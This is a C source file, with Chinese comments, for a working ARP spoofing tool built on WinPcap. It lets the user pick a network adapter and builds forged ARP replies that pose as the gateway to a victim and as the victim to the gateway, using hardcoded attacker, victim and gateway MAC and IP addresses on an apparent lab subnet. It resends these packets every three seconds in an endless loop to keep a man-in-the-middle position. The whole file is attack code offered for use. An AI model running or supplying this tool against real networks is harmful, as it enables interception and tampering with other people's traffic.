#include "pcap.h"
#pragma comment(lib,"Packet.lib")
#pragma comment(lib,"wpcap.lib")
#pragma comment(lib,"ws2_32.lib")


pcap_t * init()
{
	pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum;
	int i = 0;         //网卡数量
	pcap_t *adhandle;
	char errbuf[PCAP_ERRBUF_SIZE];

	/* Retrieve the device list */
	//获取当前网卡列表
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	//打印网卡的列表
	for (d = alldevs; d; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		//如果有网卡就打印出来
		if (d->description)
		{
			printf("(%s)\n ", d->description);
		}
		else
		{
			printf(" (No description available)\n ");
		}

	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return 0;
	}
	printf("Enter the interface number (1-%d):", i);
	scanf("%d", &inum);


	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return 0;
	}

	//跳转到所选择的适配器
	for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++)

		//打开所选的网卡适配器
		if ((adhandle = pcap_open_live(d->name,   //适配器的名称
			65535,                                //捕获的数据包的部分。
												  //65535是捕获所有流经的数据包,所有的数据包通过都产生端口
			1,
			1000,                                 //读取超时时间
			errbuf                                //错误缓存
		))
			== NULL)
		{
			fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
			/* Free the device list */
			pcap_freealldevs(alldevs);
			return 0;
		}

	printf("\nlistening on %s...\n", d->description);

	/* At this point, we don't need any more the device list. Free it */
	//当监控某个网卡适配器后，就释放其他的，因为用不到了
	pcap_freealldevs(alldevs);

	return adhandle;

}

//作用：调整结构体的边界对齐，让其以一个字节对齐；
#pragma pack(push, 1)  //使结构体按1字节方式对齐


//以太网头部(14字节)
#define EPT_IP 0x0800       // eh_type: IP 
#define EPT_ARP 0x0806      // eh_type: ARP 
#define EPT_RARP 0x8035     // eh_type: RARP 
typedef struct eh_hdr
{
	UCHAR eh_dst[6];        // 接收方MAC地址 
	UCHAR eh_src[6];        // 发送方MAC地址 
	USHORT eh_type;         // 上层协议类型 
}EH_HEADR, *P_EH_HEADR;

//arp应答/请求(28字节)
#define ARP_HARDWARE 0x0001  // arp_hrd：以太网
#define ARP_REQUEST 0x0001   // arp_op： 请求 request 
#define ARP_REPLY 0x0002     // arp_op： 应答 reply 
typedef struct arp_hdr
{
	USHORT arp_hrd;          // 硬件类型 
	USHORT arp_pro;          // 协议类型 
	UCHAR  arp_hln;          // 硬件（MAC）地址长度 
	UCHAR  arp_pln;          // 协议（IP ）地址长度 
	USHORT arp_op;           // 包类型：请求、应答
	UCHAR  arp_sha[6];       // 发送发硬件地址 （应答时，此处可欺骗）
	ULONG  arp_spa;          // 发送方协议地址 （应答时，此处可欺骗）
	UCHAR  arp_tha[6];       // 接收方硬件地址 （请求时，此处无用）
	ULONG  arp_tpa;          // 接收方协议地址 
}ARP_HEADR, *P_ARP_HEADR;


//ARP协议栈
typedef struct arp_Packet
{
	EH_HEADR ehhdr;
	ARP_HEADR arphdr;
} ARP_PACKET, *P_ARP_PACKET;
void ChangeMacAddr(char *p, UCHAR a[])      //把输入的12字节的MAC字符串，转变为6字节的16进制MAC地址
{
	char* p1 = NULL;
	int i = 0;
	int high, low;
	char temp[1];
	for (i = 0; i < 6; i++)
	{
		p1 = p + 1;
		switch (*p1) //计算低位的16进进制
		{
		case 'A': low = 10;        break;
		case 'B': low = 11;        break;
		case 'C': low = 12;        break;
		case 'D': low = 13;        break;
		case 'E': low = 14;        break;
		case 'F': low = 15;        break;
		default: temp[0] = *p1;
			low = atoi(temp); //如果为数字就直接转变成对应的数值
		}

		switch (*p) //计算高位的16进制
		{
		case 'A': high = 10;       break;
		case 'B': high = 11;       break;
		case 'C': high = 12;       break;
		case 'D': high = 13;       break;
		case 'E': high = 14;       break;
		case 'F': high = 15;       break;
		default: temp[0] = *p;
			high = atoi(temp); //如果为数字就直接转变成对应的数值
		}
		p += 2; //指针指向下一个X(高)X(低)字符串

		a[i] = high * 16 + low; //求和得16进制值
	}
}

void makeArpPacket(ARP_PACKET &ARPPacket, char * srcMac, char * srcIP, char * dstMac, char * dstIP)
{
	UCHAR MacAddr[6] = { 0 };

	//以太网头
	ChangeMacAddr(dstMac, ARPPacket.ehhdr.eh_dst);   //目的MAC地址
	ChangeMacAddr(srcMac, ARPPacket.ehhdr.eh_src);   //源MAC地址。
	ARPPacket.ehhdr.eh_type = htons(EPT_ARP);        //数据类型ARP请求或应答

													 //ARP头                                     
	ARPPacket.arphdr.arp_hrd = htons(ARP_HARDWARE);  //硬件地址为0x0001表示以太网地址
	ARPPacket.arphdr.arp_pro = htons(EPT_IP);        //协议类型字段为0x0800表示IP地址
	ARPPacket.arphdr.arp_hln = 6;                    //硬件地址长度和协议地址长度分别指出硬件地址和协议地址的长度，
	ARPPacket.arphdr.arp_pln = 4;                    //以字节为单位。对于以太网上IP地址的ARP请求或应答来说，它们的值分别为6和4。
	ARPPacket.arphdr.arp_op = htons(ARP_REPLY);      //ARP请求值为1,ARP应答值为2,RARP请求值为3,RARP应答值为4
	ChangeMacAddr(srcMac, ARPPacket.arphdr.arp_sha); //发送方 源MAC地址（欺骗的MAC地址）
	ARPPacket.arphdr.arp_spa = inet_addr(srcIP);     //发送方 源IP地址 （欺骗的MAC地址）
	ChangeMacAddr(dstMac, ARPPacket.arphdr.arp_tha); //目标的MAC地址 
	ARPPacket.arphdr.arp_tpa = inet_addr(dstIP);     //目标的IP地址  
}


//发送数据包
void sendArpPacket(pcap_t * fp, ARP_PACKET &ARPPacket)
{
	/* Send down the packet */
	if (pcap_sendpacket(fp,             // Adapter
		(const u_char *)&ARPPacket,     // buffer with the packet
		sizeof(ARPPacket)               // size
	) != 0)
	{
		fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(fp));
		return;
	}

}

int main(int argc, char* argv[])
{

	//1.初始化网络环境
	pcap_t * adhandle = init();

	//2.填充数据包
	ARP_PACKET ARPPacket_A = { 0 }; //arp包 欺骗目标
	ARP_PACKET ARPPacket_B = { 0 }; //arp包 欺骗网关

//005056C00008 这个mac地址是攻击者的地址

	//欺骗受害者，我是网关
	makeArpPacket(ARPPacket_A, "005056C00008", "192.168.57.2", "000C2933793C", "192.168.57.129");
	//欺骗网关，我是受害者
	makeArpPacket(ARPPacket_B, "005056C00008", "192.168.57.129", "005056E81E88", "192.168.57.2");


	while (true)
	{
		//3.发送数据包
		sendArpPacket(adhandle, ARPPacket_A);
		sendArpPacket(adhandle, ARPPacket_B);
		printf("send OK ! \n");
		Sleep(3000);
	}

	pcap_close(adhandle);
	return 0;
}
